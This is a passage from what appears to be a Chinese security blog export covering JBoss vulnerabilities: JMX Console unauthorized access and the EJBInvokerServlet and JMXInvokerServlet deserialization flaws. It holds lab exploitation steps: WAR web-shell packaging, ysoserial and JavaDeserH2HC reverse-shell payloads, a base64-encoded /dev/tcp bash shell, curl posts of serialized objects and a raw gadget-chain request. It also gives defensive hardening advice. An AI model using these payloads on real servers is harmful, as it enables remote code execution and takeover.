<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用Java生成</button></li><li class="tab"><button type="button" data-href="#-2">直接打包shell</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jar cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">压缩shell.jsp成shell.zip,然后shell.zip改名为shell.war</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>文件上传漏洞</category>
        <category>JBoss</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss JMX Console未授权访问漏洞</title>
    <url>//8e92a3ee39a7.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​    此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。</p>
<p>由于 JBoss Web Server 缺少默认身份验证强制执行，因此也可以完全控制应用程序。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>全版本</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下地址</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor</span><br></pre></td></tr></table></figure>

<p>如果可以成功访问，证明存在此漏洞</p>
<p>该页面为JBoss控制台，暴漏在公网存在多处漏洞</p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
        <tag>访问控制错误漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss EJBInvokerServlet 反序列化漏洞 - CVE-2013-4810</title>
    <url>//5ced298ab0a9.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>由于<code>JBoss</code>中<code>invoker/EJBInvokerServlet</code>路径对外开放，</p>
<p><code>EJBInvokerServlet</code> 利用的是 <code>org.jboss.invocation.MarshalledValue</code> 进行的反序列化操作</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>&gt;= JBoss 6.x</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下地址</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/invoker/EJBInvokerServlet</span><br></pre></td></tr></table></figure>

<p>如果提示下载信息，则说明存在此漏洞</p>
<p>监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>下载JavaDeserH2HC工具</p>
<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/EJBInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>

<p>也可以使用<code>ysoserial.jar</code>工具</p>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/EJBInvokerServlet --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>

<p>HTTP头部抓包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/invoker/EJBInvokerServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li><p>删除<code>http-invoker.sar</code>组件</p>
</li>
<li><p>设置<code>http-invoker</code></p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br><span class="line"></span><br><span class="line">在security-constraint 标签中添加以下代码</span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>升级JBoss版本</p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss JMXInvokerServlet 反序列化漏洞 - CVE-2015-7501</title>
    <url>//7ce29cf4d767.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>JBoss在 <code>/invoker/JMXInvokerServlet</code> 请求中读取了用户传入的对象，然后我们可以利用 <code>Apache Commons Collections</code> 中的 <code>Gadget</code> 执行任意代码。</p>
<p>由于<code>JBoss</code>中<code>invoker/JMXInvokerServlet</code>路径对外开放，JBoss的<code>jmx</code>组件⽀持Java反序列化导致产生漏洞。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：3.2.4~4.0.5</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下地址</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/invoker/JMXInvokerServlet</span><br></pre></td></tr></table></figure>

<p>如果提示下载信息，则说明存在此漏洞</p>
<p>监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>下载JavaDeserH2HC工具</p>
<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>

<p>也可以使用<code>ysoserial.jar</code>工具</p>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
